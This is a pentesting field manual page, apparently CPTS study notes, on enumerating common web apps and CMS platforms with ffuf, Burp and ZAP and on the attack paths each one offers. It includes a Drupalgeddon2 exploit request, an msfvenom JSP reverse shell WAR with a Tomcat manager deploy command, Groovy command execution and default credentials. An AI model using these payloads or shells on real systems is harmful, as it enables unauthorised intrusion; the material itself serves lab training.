---
title: "Common Web Applications"
description: "Fingerprints, enumeration commands, and high-value attack surfaces for the CMS and enterprise apps that recur in CPTS labs."
category: "Field Manual"
tags: ["field-manual", "cpts", "web", "cms", "enumeration"]
date: 2026-11-11
published: true
status: archive
---

# Common Web Applications

For each app: fingerprint → version → known CVEs → admin access → file/config leakage → RCE path.

> [!warning] CVE numbers are version-specific. Confirm the exact version before using an exploit; do not assume a vulnerability exists because the product name matches.

## Directory and parameter discovery

Start with the application's canonical hostname, observed routes and normal browser requests. For DNS, vhosts and technology identification, use [[pending/field-manual/01-information-gathering/web-enumeration|Web enumeration]]. Replace the example `search.php` handler below with an observed search/read endpoint.

| Input / wordlist | Use |
|---|---|
| `/usr/share/seclists/Discovery/Web-Content/common.txt` | Short first pass over common paths; also useful for Burp Intruder or ZAP Fuzzer |
| `/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt` | Directory candidates for recursive discovery |
| `params.txt` | One candidate parameter name per line, seeded from forms, JavaScript, proxy history and API documentation |
| `/usr/share/seclists/Fuzzing/alphanum-case.txt` | Small character/case payload set for ordinary input-behavior comparisons |
| `folders.txt`, `wordlist.txt`, `extensions.txt` | Separate directory, basename and suffix lists for combined path discovery |

### Baseline, directories and recursion

```bash
curl -i http://inlanefreight.com/recon-no-such-path-7f39
ffuf -u http://inlanefreight.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -ac
ffuf -recursion -recursion-depth 1 -u http://inlanefreight.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt \
  -mc all -ac
```

Compare a nonexistent path with real pages before filtering. A 200 response can be a soft 404, while a 302 may send every candidate to the same login page. Record status, length, words, lines and `Location`; manually replay interesting results with the same session context.

| `ffuf` option | Meaning |
|---|---|
| `-mc all` | Consider all status codes before applying filters |
| `-ac` | Automatically calibrate response filters; still inspect representative misses and hits |
| `-fs 612` | Example size exclusion; replace `612` with the measured baseline |
| `-fw`, `-fl` | Filter by word or line count when byte length varies |
| `-recursion -recursion-depth 1` | Discover one additional directory level from the starting URL |
| `-w file:KEYWORD` | Bind a wordlist to a named placeholder in the request |

### Combined path wordlists

Use `folders.txt` entries such as `admin` or `api` without surrounding slashes, `wordlist.txt` entries such as `index` or `status`, and `extensions.txt` entries including the leading dot, such as `.php` or `.txt`.

```bash
ffuf -w ./folders.txt:FOLDERS -w ./wordlist.txt:WORDLIST \
  -w ./extensions.txt:EXTENSIONS \
  -u http://inlanefreight.com/FOLDERS/WORDLISTEXTENSIONS \
  -mode clusterbomb -mc all
```

Repeated `-w` options supply the three lists; clusterbomb mode tests every combination. Estimate the request count as folders × basenames × extensions before choosing list sizes. Add a measured `-fs`, `-fw` or `-fl` filter for this request shape rather than reusing another endpoint's baseline.

### GET and POST parameter names

```bash
curl -i 'http://inlanefreight.com/search.php?query=enumcheck'
ffuf -u 'http://inlanefreight.com/search.php?FUZZ=enumcheck' \
  -w params.txt -mc all -ac
ffuf -u http://inlanefreight.com/search.php -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'FUZZ=enumcheck' -w params.txt -mc all -ac
```

Keep the value constant while discovering names. Preserve required parameters, cookies and CSRF fields from a valid request, and vary one position at a time. Compare the candidate with an unknown parameter and the original request: a recognized input may change a validation message, result count or redirect without changing the status code. Record parameter name, method, encoding, endpoint and observed behavior for later testing.

## Web proxy enumeration

A local proxy makes the browser's requests and the application's responses visible: browser → listener on `127.0.0.1:8080` → target. Build an endpoint and parameter inventory while browsing ordinary application features.

| Task | Burp Suite | OWASP ZAP |
|---|---|---|
| Capture browser traffic | Proxy listener, built-in browser or a browser proxy configuration | Local proxy and a browser launched/configured through ZAP |
| Pause and edit a request | Proxy → Intercept | Breakpoints / Break controls |
| Review the application map | Proxy → HTTP history and Target → Site map | History and Sites tree |
| Replay one request | Repeater | Requester / Manual Request Editor |
| Discover linked content | Site map plus crawler where available | Spider; browser-based crawling for JavaScript-heavy navigation |
| Enumerate a selected input | Intruder | Fuzzer |
| Apply a repeatable header edit | Match and replace rules | Replacer |

1. Configure the local listener and browser, then confirm a normal request appears in history. For HTTPS, trust the proxy's CA in the testing browser profile so requests can be inspected.
2. Add the application's origins to the tool's scope. Browse navigation, search and other normal features; record methods, paths, query/body inputs, cookies, content types and redirects.
3. Send an interesting request to Repeater or Requester. Preserve session state, establish its baseline response, then change one input and compare the result.
4. Use the resulting route and parameter inventory to choose a small Intruder/Fuzzer payload list. Retain the request/response pair that explains each finding.

### Send command-line traffic through the proxy

The HTTP example uses the local listener directly. For HTTPS, export the proxy CA in PEM format as `proxy-ca.pem` for the second command.

```bash
curl -x http://127.0.0.1:8080 -i http://inlanefreight.com/
curl -x http://127.0.0.1:8080 --cacert ./proxy-ca.pem -i https://inlanefreight.com/
ffuf -u http://inlanefreight.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x http://127.0.0.1:8080 -mc all -ac
```

Turn interception off while collecting automated traffic so requests do not wait at the breakpoint. Use history to verify the actual method, encoding and headers produced by the client.

### Match-and-replace rules

The source's rule standardizes the request `User-Agent` so repeated enumeration requests are easy to identify. In Burp's Proxy settings, add a request-header match-and-replace rule:

| Setting | Value |
|---|---|
| Type | Request header |
| Regex matching | Enabled |
| Match | `^User-Agent.*$` |
| Replace | `User-Agent: HackTheBox Agent 1.0` |

In ZAP Replacer, use the header-specific **Request Header (will add if not exist)** match type, match string `User-Agent`, and replacement `HackTheBox Agent 1.0`; the header name and value are separate in that mode. Check the outgoing request in history before comparing responses. Request rewriting changes what the server receives; response rewriting changes what the browser sees, so record which side a rule affects. Disable the rule when returning to the original baseline.

### Intruder and Fuzzer enumeration

Clear automatically selected Intruder positions and mark just the path component or parameter name being enumerated. Load `common.txt` for paths or `params.txt` for names, keeping ordinary test values constant. In ZAP, select the equivalent substring in a captured request and add a file-based Fuzzer payload list.

| Strategy | Use |
|---|---|
| Burp Intruder Sniper | One payload list tested at one selected position; a useful initial enumeration pass |
| Burp Intruder Pitchfork | Paired inputs from lists advanced together, such as known path/suffix pairs |
| Burp Intruder Cluster bomb | Every combination across independent positions, like the named-wordlist `ffuf` example |
| ZAP Fuzzer results | Compare status, body length, redirects and application messages, then replay distinctive results |

A length difference can come from reflected input rather than a real route or recognized parameter. Compare the body and replay the result before adding it to the application inventory.

## WordPress

```bash
wpscan --url http://$IP --enumerate vp,vt,u --api-token $WPSCAN_TOKEN
curl -s http://$IP/wp-json/wp/v2/users
curl -s http://$IP/?rest_route=/wp/v2/users
```

| Surface | Check |
|---|---|
| Version | `readme.html`, `wp-includes/version.php`, meta generator |
| Users | REST API, author archives, `wpscan -e u` |
| Plugins/themes | `wpscan -e vp,vt`, directory listing, readme files |
| Config | `wp-config.php`, backups, `wp-config.php.bak` |
| Admin | `/wp-admin`, `/wp-login.php`, XML-RPC brute force |
| RCE | Vulnerable plugin/theme upload, theme editor, PHP filter |

XML-RPC brute force:

```bash
curl -s http://$IP/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```

If you get admin access, the theme editor (`/wp-admin/theme-editor.php`) can write PHP. Prefer a plugin upload if the editor is disabled.

## Joomla

```bash
joomscan -u http://$IP
curl -s http://$IP/administrator/manifests/files/joomla.xml
curl -s http://$IP/README.txt
```

- `/administrator` admin panel.
- `configuration.php` and `configuration.php~` backups.
- `?option=com_*` component enumeration; old components often have LFI/SQLi.
- Template editor for PHP execution after admin login.
- Check `htaccess.txt`, `web.config.txt`, and `tmp/` for writable paths.

## Drupal

```bash
droopescan scan drupal -u http://$IP
curl -s http://$IP/CHANGELOG.txt | head
curl -s http://$IP/core/CHANGELOG.txt | head
```

| Version | Relevant issue |
|---|---|
| 7.x < 7.58 | Drupalgeddon2 (CVE-2018-7600), Drupalgeddon3 (CVE-2018-7602) |
| 8.x < 8.5.1 | Drupalgeddon2 |
| Any with PHP filter enabled | PHP code execution via content |

Drupalgeddon2 request shape (lab only):

```http
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
```

If admin: enable the PHP filter module, create a page with PHP code, or use a module upload.

## Tomcat

```bash
curl -s http://$IP:8080/manager/html
curl -s http://$IP:8080/host-manager/html
nmap -p8080 --script http-title,http-headers $IP
```

- Default/weak manager credentials (`tomcat:tomcat`, `admin:admin`).
- Manager → deploy a crafted WAR → JSP shell.
- Ghostcat (CVE-2020-1938) can read `WEB-INF/web.xml` and other files if AJP is exposed (8009).
- Version in error pages, `Server` header, and `/docs/`.

WAR deployment via manager:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
curl -u tomcat:tomcat --upload-file shell.war http://$IP:8080/manager/text/deploy?path=/shell
```

## Jenkins

```bash
curl -s http://$IP:8080/
curl -s http://$IP:8080/script
curl -s http://$IP:8080/manage
```

| Surface | Check |
|---|---|
| Auth | Anonymous read, default admin, signup enabled |
| Script console | `/script` → Groovy RCE |
| Credentials | `/credentials`, build logs, environment variables |
| Nodes | `/computer`, agent port 50000 |
| Plugins | Known vulnerable plugins, update center |

Groovy command execution (authorised lab):

```groovy
def proc = ["/bin/sh", "-c", "id"].execute()
println proc.text
```

## Splunk

```bash
curl -sk https://$IP:8089/services/server/info
curl -s http://$IP:8000/en-US/account/login
```

- Web UI 8000, management API 8089, forwarding 9997.
- Default `admin:changeme` on older installs.
- After login: install a custom app with a scripted input/alert to execute commands.
- Search app for credentials and indexed logs.
- Check `/services/authentication/users` with valid credentials.

## GitLab

```bash
curl -s http://$IP/help | grep -i version
curl -s http://$IP/users/sign_in
```

- Version disclosure at `/help`.
- Public projects, snippets, issues, and CI variables can leak secrets.
- CVE-2021-22205: unauthenticated RCE via malicious image upload (ExifTool) in affected versions.
- After login: project import, CI runner, and webhooks can execute code.
- Check `/admin`, `/explore`, and API at `/api/v4`.

## PRTG Network Monitor

```bash
curl -s http://$IP:8080/
curl -s http://$IP:8080/index.htm
```

- Default `prtgadmin:prtgadmin` is common in labs.
- CVE-2018-9276: authenticated command injection via notification definitions.
- After login: Setup → Notifications → add "Execute Program" with a command.
- Configuration files and stored credentials may be readable.

## osTicket

```bash
curl -s http://$IP/
curl -s http://$IP/scp/login.php
```

- Agent panel `/scp/`, admin panel `/scp/admin.php`.
- Version in `/include/ost-config.php` or page footer.
- Tickets are user-controlled input: test stored XSS in agent view.
- Check for exposed `ost-config.php`, database backups, and email piping.
- Weak agent/admin credentials are common.

## ColdFusion

```bash
curl -s http://$IP:8500/CFIDE/administrator/
nmap -p8500 --script http-title,http-headers $IP
```

- `/CFIDE/administrator` admin panel; default/weak passwords.
- CVE-2010-2861: LFI in `CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm`.
- CVE-2023-26360: deserialization/file read in affected versions.
- After admin: scheduled task or mapping to execute CFML.
- Check `CFIDE/administrator/settings/mappings.cfm`.

## IIS

```bash
curl -I http://$IP
nmap -p80,443 --script http-iis-short-name-brute,http-webdav-scan,http-methods $IP
```

- Short-name (8.3 tilde) enumeration reveals hidden files/directories.
- WebDAV enabled → upload and execute (if `WebDAV` and script execution allowed).
- `trace.axd`, `elmah.axd`, `web.config`, `appsettings.json`.
- ASP.NET machine keys in `web.config` → ViewState deserialization.
- Default pages, virtual directories, and app pools in `applicationHost.config`.

## Magento

```bash
curl -s http://$IP/magento_version
curl -s http://$IP/admin
curl -s http://$IP/app/etc/env.php
```

- Version at `/magento_version` (if enabled) or composer files.
- Admin panel path may be customized; find it in `app/etc/env.php` or config.
- `app/etc/env.php` backups can leak DB credentials and crypt keys.
- Known CVEs depend on version; confirm before exploiting.
- After admin: install a malicious module or edit a template for PHP execution.

## Comparison table

| App | Default port | Quick win |
|---|---|---|
| WordPress | 80/443 | Plugin/theme RCE, XML-RPC brute force |
| Joomla | 80/443 | Admin template edit, vulnerable component |
| Drupal | 80/443 | Drupalgeddon2/3, PHP filter |
| Tomcat | 8080 | Manager WAR deploy, Ghostcat |
| Jenkins | 8080 | `/script` Groovy console |
| Splunk | 8000/8089 | Default creds, custom app RCE |
| GitLab | 80/443 | Public repos, CVE-2021-22205 |
| PRTG | 8080 | Default creds, notification command injection |
| osTicket | 80/443 | Stored XSS, config/database leak |
| ColdFusion | 8500 | Admin panel, LFI, deserialization |
| IIS | 80/443 | Tilde enumeration, WebDAV, ViewState |
| Magento | 80/443 | `env.php` leak, admin module upload |

## References

- [HackTricks — Web](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html)
- [WPScan](https://wpscan.com/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/) for post-exploitation after web RCE
- [HTB Academy — Using Web Proxies](https://academy.hackthebox.com/module/details/110)
- [HTB Academy — Match and replace rules](https://academy.hackthebox.com/module/110/section/1050)
- [OWASP ZAP](https://www.zaproxy.org/)
